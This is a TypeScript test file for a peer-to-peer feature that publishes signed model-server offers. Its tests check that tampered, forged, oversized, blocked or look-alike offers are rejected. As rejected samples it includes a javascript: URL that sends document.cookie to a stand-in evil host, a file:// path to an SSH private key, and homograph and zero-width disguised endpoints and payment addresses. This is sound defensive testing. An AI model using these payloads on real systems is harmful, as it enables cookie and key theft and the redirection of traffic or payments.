import { describe, expect } from "bun:test"
import { generateKeyPairSync, sign } from "node:crypto"
import { Effect } from "effect"
import { CommunityContacts } from "@novaclaw/core/community/contacts"
import { CommunityOffer } from "@novaclaw/core/community/offer"
import { CommunityOfferTable } from "@novaclaw/core/community/sql"
import { Database } from "@novaclaw/core/database/database"
import { LayerNode } from "@novaclaw/core/effect/layer-node"
import { InstanceIdentityStore } from "@novaclaw/core/instance-identity-store"
import { testEffect } from "./lib/effect"

/**
 * Community P6 — signed service offers (`notes/spec/community-p2p.md`).
 *
 * The owner's motivation: *"users may offer their model servers for free or for btc."* What a
 * signature buys here is narrow and worth stating — an offer travels through strangers, so the thing
 * to protect is its ENDPOINT and its TERMS, because those are what an intermediary would profit from
 * changing.
 */

const it = testEffect(
  LayerNode.compile(
    LayerNode.group([Database.node, InstanceIdentityStore.node, CommunityContacts.node, CommunityOffer.node]),
  ),
)

/**
 * A genuinely foreign signed offer: a fresh ed25519 keypair, the same construction `publish` uses.
 * ⚠️ Minting one is free and no proof-of-work is involved anywhere — which is the finding below.
 */
const stranger = (endpoint: string) => {
  const { publicKey, privateKey } = generateKeyPairSync("ed25519")
  const raw = (publicKey.export({ type: "spki", format: "der" }) as Buffer).subarray(-32)
  const unsigned = { ...terms, models: [...terms.models], endpoint, from: `nid_${raw.toString("base64url")}`, at: 1 }
  const signature = sign(null, Buffer.from(CommunityOffer.canonicalBytes(unsigned)), privateKey)
  return { ...unsigned, signature: signature.toString("base64url") }
}

const terms = {
  kind: "model-server",
  endpoint: "https://spark.example:8010/v1",
  models: ["holo3.1", "gemma-4-E4B"],
  price: "free",
  payTo: "nancy@getalby.com",
} as const

describe("CommunityOffer", () => {
  it.effect("an offer is signed as this instance, and comes back verifiable", () =>
    Effect.gen(function* () {
      const offers = yield* CommunityOffer.Service
      const me = (yield* InstanceIdentityStore.Service.pipe(Effect.flatMap((s) => s.identity()))).networkID

      const published = yield* offers.publish(terms)
      expect(published.from).toBe(me)
      expect(CommunityOffer.verify(published)).toBe(true)
      expect(yield* offers.mine()).toEqual(published)

      yield* offers.withdraw()
      expect(yield* offers.mine()).toBeUndefined()
    }).pipe(),
  )

  it.effect("🔴 the ENDPOINT cannot be rewritten in flight", () =>
    Effect.gen(function* () {
      /**
       * The attack worth stopping. An offer passes through instances that did not write it, and the
       * profitable edit is not the model list or the price — it is where the traffic goes. A user
       * who accepts a rewritten offer sends their prompts to whoever rewrote it.
       */
      const offers = yield* CommunityOffer.Service
      const published = yield* offers.publish(terms)

      const moved = { ...published, endpoint: "https://attacker.example/v1" }
      expect(CommunityOffer.verify(moved)).toBe(false)
      // The other terms are covered too: a relay must not be able to make somebody's free offer
      // paid, or advertise models they never claimed.
      expect(CommunityOffer.verify({ ...published, price: "0.01 btc per request" })).toBe(false)
      expect(CommunityOffer.verify({ ...published, models: [...published.models, "gpt-9"] })).toBe(false)
      expect(CommunityOffer.verify({ ...published, models: [] })).toBe(false)
      expect(CommunityOffer.verify({ ...published, from: `nid_${Buffer.alloc(32, 4).toString("base64url")}` })).toBe(
        false,
      )
    }).pipe(),
  )

  it.effect("🔴 field boundaries are unambiguous — a shifted character breaks it", () =>
    Effect.gen(function* () {
      /**
       * ⚠️ Between ADJACENT fields, and the first version was VACUOUS for missing that. It shifted a
       * character from `endpoint` into `models`, which are not neighbours — `price`, the timestamp
       * and the model count all sit between them — so the bytes differ either way and the test passed
       * with the length prefixes deleted. Caught by deleting them and watching all five tests stay
       * green. (The same mistake was made earlier in this program against the channel envelope; a
       * concatenation test only means something where two fields actually touch.)
       *
       * `endpoint` and `price` ARE neighbours: without prefixes, `…/x` + `free` and `…/xf` + `ree`
       * are the same bytes, so one signature would validate an offer pointing somewhere else.
       */
      const offers = yield* CommunityOffer.Service
      const published = yield* offers.publish({ ...terms, endpoint: "https://a.example/x", price: "free" })
      expect(CommunityOffer.verify(published)).toBe(true)

      const shifted = { ...published, endpoint: "https://a.example/xf", price: "ree" }
      expect(CommunityOffer.verify(shifted)).toBe(false)
    }).pipe(),
  )

  it.effect("🔴 an offer SURVIVES a rotation, re-signed under the new identity", () =>
    Effect.gen(function* () {
      /**
       * ⚠️ My first version asserted the offer should be WITHHELD after a rotation, and it was wrong
       * in both directions. It is not broken — `verify` checks against the key embedded in the offer,
       * so an offer signed by the old key stays perfectly valid. And withholding it would contradict
       * the feature it depends on: rotation exists so relationships survive a key change, and an
       * advertisement that vanished when the user rotated would be the opposite of that.
       *
       * What is actually wrong is serving it UNCHANGED: a peer would read one identity from
       * `/global/health` and a different one from the offer, which looks like somebody else's.
       */
      const offers = yield* CommunityOffer.Service
      const store = yield* InstanceIdentityStore.Service
      const before = yield* offers.publish(terms)
      const rotated = yield* store.rotate()

      const after = yield* offers.mine()
      expect(after).toBeDefined()
      // Same offer, new signer — matching the identity a peer sees on `/global/health`.
      expect(after?.from).toBe(rotated.identity.networkID)
      expect(after?.from).not.toBe(before.from)
      expect(after?.endpoint).toBe(terms.endpoint)
      expect([...(after?.models ?? [])]).toEqual([...terms.models])
      expect(CommunityOffer.verify(after!)).toBe(true)

      // And it stays put: a second read does not re-sign again, which would churn `at` on every fetch.
      expect(yield* offers.mine()).toEqual(after)
    }).pipe(),
  )

  it.effect("malformed offers are refused rather than thrown on", () =>
    Effect.gen(function* () {
      const offers = yield* CommunityOffer.Service
      const published = yield* offers.publish(terms)
      for (const broken of [
        { ...published, signature: "" },
        { ...published, signature: "!!!!" },
        { ...published, at: Number.NaN },
        { ...published, models: [1 as unknown as string] },
        { ...published, kind: "something-else" as "model-server" },
      ])
        expect(CommunityOffer.verify(broken)).toBe(false)
    }).pipe(),
  )

  it.effect("🔴 a forged offer cannot be LAUNDERED through an honest instance", () =>
    Effect.gen(function* () {
      /**
       * The attack collection makes possible. An instance collects offers from peers and serves what
       * it knows — so if it stored whatever it was handed, a peer could give it a forged offer naming
       * a third party's endpoint, and every instance downstream would receive that claim from a
       * source it trusts. The signature is what makes passing an offer along harmless; storing one
       * unverified is what would make it dangerous.
       */
      const offers = yield* CommunityOffer.Service
      const stranger = `nid_${Buffer.alloc(32, 7).toString("base64url")}`

      // A claim about somebody else's endpoint, with no valid signature behind it.
      const forged = {
        kind: "model-server" as const,
        endpoint: "https://attacker.example/v1",
        models: ["holo3.1"],
        price: "free",
        payTo: "attacker@theirdomain.com",
        from: stranger,
        at: Date.now(),
        signature: Buffer.alloc(64, 1).toString("base64url"),
      }
      expect(yield* offers.learn(forged)).toBe(false)
      expect(yield* offers.known()).toEqual([])

      // ⚠️ And a peer cannot plant an offer under OUR identity, which would have us advertising a
      // stranger's endpoint as our own to everyone who asks.
      const me = (yield* InstanceIdentityStore.Service.pipe(Effect.flatMap((s) => s.identity()))).networkID
      const published = yield* offers.publish(terms)
      expect(yield* offers.learn({ ...published, from: me })).toBe(false)
      expect(yield* offers.known()).toEqual([])
      // Our own offer is still ours, and is not listed among the peers'.
      expect((yield* offers.mine())?.from).toBe(me)
    }).pipe(),
  )

  it.effect("🔴 the PAYMENT ADDRESS is under the signature — the most profitable edit there is", () =>
    Effect.gen(function* () {
      /**
       * An intermediary who could rewrite where money goes, while leaving the endpoint intact, has the
       * most profitable edit available in this protocol: the victim keeps getting the service they
       * expect and never notices the payments went elsewhere. The endpoint is protected for the same
       * reason and money is the more attractive target, which is why this is a field rather than more
       * prose inside `price`.
       */
      const offers = yield* CommunityOffer.Service
      const published = yield* offers.publish(terms)
      expect(published.payTo).toBe("nancy@getalby.com")
      expect(CommunityOffer.verify(published)).toBe(true)

      expect(CommunityOffer.verify({ ...published, payTo: "attacker@theirdomain.com" })).toBe(false)
      expect(CommunityOffer.verify({ ...published, payTo: "" })).toBe(false)

      // ⚠️ `price` and `payTo` are NEIGHBOURS in the signed bytes, so this is the case a naive
      // concatenation cannot tell apart: a character moved across their boundary.
      const shifted = yield* offers.publish({ ...terms, price: "free", payTo: "x@y.z" })
      expect(CommunityOffer.verify({ ...shifted, price: "freex", payTo: "@y.z" })).toBe(false)

      // An offer with no payment address is ordinary, not broken — most will have none.
      const unpaid = yield* offers.publish({ ...terms, payTo: "" })
      expect(CommunityOffer.verify(unpaid)).toBe(true)
    }).pipe(),
  )

  it.effect("🔴 an offer is BOUNDED — it is re-verified on every read", () =>
    Effect.gen(function* () {
      /**
       * The amplifier in this design. `known` re-verifies each stored offer on every read, because a
       * row edited on disk must not be served as though a peer had signed it — so a peer who signs
       * ONCE over a hundred thousand model names makes this instance hash all of them every time a
       * user opens the screen. One signature for them; a cost per view for us, forever.
       */
      const offers = yield* CommunityOffer.Service
      const huge = yield* offers.publish({
        ...terms,
        models: Array.from({ length: CommunityOffer.MAX_MODELS + 1 }, (_, index) => `model-${index}`),
      })
      // Signed by us and still refused: the bound binds on the way OUT too, so an offer stored by an
      // older build stops being served rather than being trusted because it is on disk.
      expect(CommunityOffer.verify(huge)).toBe(false)
      expect(yield* offers.mine()).toBeUndefined()

      // Long fields are refused the same way, whichever one carries the weight.
      const long = "x".repeat(CommunityOffer.MAX_FIELD_BYTES + 1)
      for (const field of ["endpoint", "price", "payTo"] as const) {
        const published = yield* offers.publish({ ...terms, [field]: long })
        expect(CommunityOffer.verify(published)).toBe(false)
      }

      // ⚠️ And an ordinary offer still passes — a bound that refused real ones would be worse than none.
      const normal = yield* offers.publish(terms)
      expect(CommunityOffer.verify(normal)).toBe(true)
    }).pipe(),
  )

  it.effect("🔴 the offer STORE is bounded — a row costs a keypair and is re-verified on every read", () =>
    Effect.gen(function* () {
      /**
       * The product of two defects each already fixed in its own terms, which is exactly why it
       * survived both: succession was bounded because minted keys are free, and the offer ENVELOPE
       * was bounded because `verify` runs on every read. Nobody bounded the offer COUNT — and a row
       * is keyed on the offerer's identity, so the same free keypair buys one.
       *
       * ⚠️ Measured at 46.6 µs to verify, and `GET /api/community/offer` is unauthenticated with no
       * proof-of-work anywhere on the path: 500,000 rows is 23 SECONDS of CPU for a request that
       * costs the caller a TCP connection. It also draws the user's own Community panel.
       */
      const offers = yield* CommunityOffer.Service
      const contacts = yield* CommunityContacts.Service
      const { db } = yield* Database.Service

      // Genuinely foreign offers — signed with keys this instance does not hold, which is the whole
      // point: minting one is free and there is no work to do.
      const friend = stranger("https://friend.example/v1")
      expect(CommunityOffer.verify(friend)).toBe(true)
      yield* contacts.add({ networkID: friend.from, petname: "a real friend" }).pipe(Effect.orDie)
      expect(yield* offers.learn(friend)).toBe(true)

      const flood = CommunityOffer.MAX_OFFERS + CommunityOffer.PRUNE_SLACK + 50
      const rows = Array.from({ length: flood }, (_, index) => {
        const key = Buffer.alloc(32)
        key.writeUInt32BE(index + 1000, 0)
        return { id: `nid_${key.toString("base64url")}`, document: "{}" }
      })
      for (let start = 0; start < rows.length; start += 200)
        yield* db
          .insert(CommunityOfferTable)
          .values(rows.slice(start, start + 200))
          .run()

      // One more real offer trips the trim.
      expect(yield* offers.learn(stranger("https://last.example/v1"))).toBe(true)

      const total = yield* db.$count(CommunityOfferTable).pipe(Effect.orDie)
      expect(total).toBeLessThanOrEqual(CommunityOffer.MAX_OFFERS + 1)

      /**
       * 🔴 The friend's offer survived the flood, and it is the OLDEST row here — so recency alone
       * would have discarded it. A bound that dropped the offer a user was about to accept, to make
       * room for a flood, is the attack succeeding by a different route.
       */
      expect((yield* offers.known()).map((offer) => offer.endpoint)).toContain("https://friend.example/v1")
    }).pipe(),
  )

  it.effect("🔴 an offer from a BLOCKED peer is not collected", () =>
    Effect.gen(function* () {
      /**
       * Probed live: an instance that had blocked a peer still collected that peer's offer and put
       * it on the user's screen — endpoint, models and Lightning address included. An offer is
       * content a stranger wrote, displayed in the user's own window, so "I do not want to hear from
       * this person" has to cover it.
       *
       * ⚠️ Blocking was consulted in exactly three places out of the subsystem's many doors. The
       * shape is the airgap's: a cross-cutting rule applied service by service, where each service
       * had to remember.
       */
      const offers = yield* CommunityOffer.Service
      const contacts = yield* CommunityContacts.Service
      const theirs = stranger("https://theirs.example/v1")

      // THE CONTROL FIRST — a refusal means nothing unless the same call succeeds unblocked.
      expect(yield* offers.learn(theirs)).toBe(true)
      expect((yield* offers.known()).map((o) => o.endpoint)).toEqual(["https://theirs.example/v1"])

      yield* contacts.add({ networkID: theirs.from, petname: "them" }).pipe(Effect.orDie)
      yield* contacts.setBlocked(theirs.from, true)

      /**
       * ⚠️ The SAME offer, byte for byte, so it still verifies. My first version of this changed the
       * endpoint to make it "a new offer" — which breaks the signature, so `learn` returned false
       * from `verify` and the test would have passed with the block check deleted. A refusal only
       * means what you think it means when the ONLY thing changed is the thing under test.
       */
      expect(CommunityOffer.verify(theirs)).toBe(true)
      expect(yield* offers.learn(theirs)).toBe(false)
    }).pipe(),
  )

  it.effect("🔴 an endpoint must be an http(s) URL — it decides what our own SERVER opens", () =>
    Effect.gen(function* () {
      /**
       * The endpoint was any string up to 512 bytes. It does not merely sit on screen: "Use this"
       * prefills the add-model dialog, and that dialog probes through `POST /provider/:id/probe`,
       * which runs SERVER-SIDE. So the scheme a stranger chose decided what the user's own server
       * would open — `file://` reads the disk it runs on.
       */
      const offers = yield* CommunityOffer.Service
      for (const endpoint of [
        "file:///C:/Users/someone/.ssh/id_ed25519",
        "javascript:fetch('http://evil.example?c='+document.cookie)",
        "ftp://files.example/x",
        "not a url at all",
        "",
        // ⚠️ Reads as http and is NOT: `httpx:` passes any `startsWith("http")` test, which is the
        // hand-rolled check this one deliberately is not.
        "httpx://a.example/v1",
      ]) {
        const published = yield* offers.publish({ ...terms, endpoint })
        expect(CommunityOffer.verify(published)).toBe(false)
        // Signed by US and still refused — the bound binds on the way OUT, so an offer stored by an
        // older build stops being served rather than being trusted for sitting on disk.
        expect(yield* offers.mine()).toBeUndefined()
      }

      // 🔴 THE CONTROL: the endpoints this feature exists to carry still pass — including a LAN
      // address, which is a first-class use here and must NOT be filtered.
      for (const endpoint of [
        "https://spark.example:8010/v1",
        "http://192.168.178.40:8000/v1",
        "http://127.0.0.1:11434/v1",
        /**
         * ⚠️ Accepted, and I had this wrong first time: `new URL` NORMALISES this to
         * `http://evil/`, so it is an ordinary http URL written oddly rather than a smuggled
         * scheme. Refusing it would have been the test dictating to the runtime. Kept as a case
         * because parsing is what makes the answer right in both directions.
         */
        "http:evil",
      ]) {
        const published = yield* offers.publish({ ...terms, endpoint })
        expect(CommunityOffer.verify(published)).toBe(true)
      }
    }).pipe(),
  )

  it.effect("🔴 an endpoint that READS as one host and REACHES another is refused", () =>
    Effect.gen(function* () {
      /**
       * The panel shows the raw string; the runtime connects to what `URL` parses. Unicode and
       * userinfo make those two different things — measured against the runtime:
       *
       *   `https://spark.example@evil.example/v1`  reads as spark.example, connects to evil.example
       *   `https://\u0455park.example/v1`           reads as spark.example, resolves xn--park-f9d.example
       *   `https://spark\uFF0Eexample/v1`           a fullwidth dot, resolving to spark.example
       *   `https://spark.example\u200B/v1`          a zero-width space, invisible in the panel
       *
       * ⚠️ The userinfo one is the sharpest: it is already canonical AND pure ASCII, and it passed
       * the scheme rule written one commit earlier. No care by the reader defeats any of them.
       */
      const offers = yield* CommunityOffer.Service
      const disguised = [
        "https://spark.example@evil.example/v1",
        "https://user:pw@evil.example/v1",
        `https://${"\u0455"}park.example/v1`,
        `https://spark${"\uFF0E"}example/v1`,
        `https://spark.example${"\u200B"}/v1`,
        `https://${"\u202E"}krovten.live/v1`,
      ]
      for (const endpoint of disguised) {
        expect(CommunityOffer.isServableEndpoint(endpoint)).toBe(false)
        const published = yield* offers.publish({ ...terms, endpoint })
        expect(CommunityOffer.verify(published)).toBe(false)
      }

      /**
       * 🔴 THE CONTROL, and it is what ruled out the first design. Requiring `url.href === endpoint`
       * would also refuse these two — a missing trailing slash and an uppercase host — both of which
       * a person may reasonably type. **A rule that rejects honest input to stop a trick is a bad
       * trade when a narrower one exists.**
       */
      for (const endpoint of [
        "https://spark.example:8010/v1",
        "http://192.168.178.40:8000/v1",
        "https://a.example",
        "http://Spark.Example/v1",
      ]) {
        expect(CommunityOffer.isServableEndpoint(endpoint)).toBe(true)
        expect(CommunityOffer.verify(yield* offers.publish({ ...terms, endpoint }))).toBe(true)
      }
    }).pipe(),
  )

  it.effect("🔴 the PAYMENT ADDRESS is what the user pastes, so it must read as it copies", () =>
    Effect.gen(function* () {
      /**
       * `payTo` reaches `navigator.clipboard.writeText` verbatim and goes from there into somebody's
       * wallet. So the string the user READS and the string they PASTE have to be the same one, and
       * measured they need not be:
       *
       *   a zero-width space inside `nancy@getalby` + `.com` renders as the honest address and
       *   copies as a different one; forty spaces hide a second address off the end of the rendered
       *   line; and a Cyrillic `a` does not even diverge — it reads as the letter it imitates.
       *
       * ⚠️ This field is MONEY, which is why it gets the endpoint's treatment while `price` beside
       * it does not: `price` is prose a human wrote and may be in any language.
       */
      const offers = yield* CommunityOffer.Service
      const ZWSP = String.fromCharCode(0x200b)
      const CYRILLIC_A = String.fromCharCode(0x430)

      for (const payTo of [
        `nancy@getalby${ZWSP}.com`,
        `n${CYRILLIC_A}ncy@getalby.com`,
        `nancy@getalby.com${" ".repeat(40)}attacker@evil.example`,
        `a@b.com${String.fromCharCode(10)}attacker@evil.example`,
      ]) {
        const published = yield* offers.publish({ ...terms, payTo })
        expect(CommunityOffer.verify(published)).toBe(false)
        expect(yield* offers.mine()).toBeUndefined()
      }

      /**
       * 🔴 THE CONTROL: every form this field legitimately takes is ASCII without spaces, so the
       * narrow rule refuses nothing real — and an EMPTY address stays valid, because free is the
       * normal case and most offers will carry none.
       */
      for (const payTo of ["nancy@getalby.com", "", "LNURL1DP68GURN8GHJ7", "lnbc1p3xyz"]) {
        const published = yield* offers.publish({ ...terms, payTo })
        expect(CommunityOffer.verify(published)).toBe(true)
      }
    }).pipe(),
  )

  it.effect("🔴 an offer the CURRENT rules refuse is reported, not silently withdrawn", () =>
    Effect.gen(function* () {
      /**
       * The upgrade path, which tests never take because they build fresh from today's rules.
       * Reproduced on a running instance: a row an older build accepted — a look-alike host, a
       * padded payment address — made the peer door answer `{}` and the panel say **"You are not
       * offering anything."** The user had published. Nothing was logged. They were simply off the
       * network, and the sentence they were shown was about a different situation entirely.
       *
       * ⚠️ Reported, not repaired: the endpoint is the user's to choose and we cannot invent a valid
       * one. `servable` hands them the fact, and the form they already have fixes it in one action.
       */
      const offers = yield* CommunityOffer.Service
      const { db } = yield* Database.Service

      expect(yield* offers.mineStored()).toEqual({ servable: false })

      const published = yield* offers.publish(terms)
      const healthy = yield* offers.mineStored()
      expect(healthy.servable).toBe(true)
      expect(healthy.offer?.endpoint).toBe(published.endpoint)

      // Rewrite the row the way a build without today's rules would have stored it.
      const stale = { ...published, payTo: `${published.payTo}${" ".repeat(20)}` }
      yield* db
        .update(CommunityOfferTable)
        .set({ document: JSON.stringify(stale) })
        .run()
        .pipe(Effect.orDie)

      const reported = yield* offers.mineStored()
      // 🔴 Still THERE, and known to be unservable — the distinction the panel needs to say which
      // of two very different sentences is true.
      expect(reported.offer?.endpoint).toBe(published.endpoint)
      expect(reported.servable).toBe(false)
      // ⚠️ And peers are correctly served nothing: the owner learning about it must not mean the
      // network being handed an offer that fails its own rules.
      expect(yield* offers.mine()).toBeUndefined()
    }).pipe(),
  )
})
